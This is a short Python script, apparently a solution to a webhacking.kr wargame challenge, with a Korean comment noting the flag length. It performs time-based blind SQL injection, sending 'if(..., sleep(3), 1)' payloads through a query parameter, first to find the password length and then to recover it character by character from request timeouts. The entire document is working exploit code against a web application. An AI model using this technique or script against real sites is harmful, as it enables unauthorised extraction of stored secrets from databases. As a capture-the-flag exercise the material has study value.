from requests.exceptions import ReadTimeout
import requests
import string

url = "https://webhacking.kr/challenge/web-34/index.php"
params = {'msg' : '1234'}
flag_length = 0
for i in range(20,30):
    try:
        payload = 'if((length(pw)={}),sleep(3),1)'.format(i)
        params['se'] = payload
        requests.get(url,params=params,timeout=2)
    except ReadTimeout:
        print("FLAG's length is",i)
        flag_length=i
        break    

# FLAG 길이 24
flag = ''
for i in range(1,flag_length+1):
    for character in string.printable:
        try:
            payload = 'if((ascii(substr(pw,{},1))={}),sleep(3),1)'.format(i,ord(character))
            params['se'] = payload
            requests.get(url,params=params,timeout=2)
        except ReadTimeout:
            flag = flag + character
            print("\r[+]",flag,end='')
            break
print()
print('FLAG : ',flag)


